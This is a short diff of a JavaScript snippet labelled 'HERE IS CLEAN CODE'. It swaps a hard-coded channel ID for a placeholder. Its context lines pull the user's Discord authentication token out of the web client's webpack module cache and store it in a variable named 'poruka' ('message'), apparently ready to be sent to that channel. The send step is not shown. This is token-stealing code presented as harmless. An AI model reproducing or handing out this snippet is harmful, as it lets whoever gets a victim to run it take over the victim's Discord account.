@@ -1,7 +1,7 @@
 //HERE IS CLEAN CODE
 
 
-let id = '997246626202652782';
+let id = 'CHANNEL ID';
 let magija = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
 let poruka = magija;
 
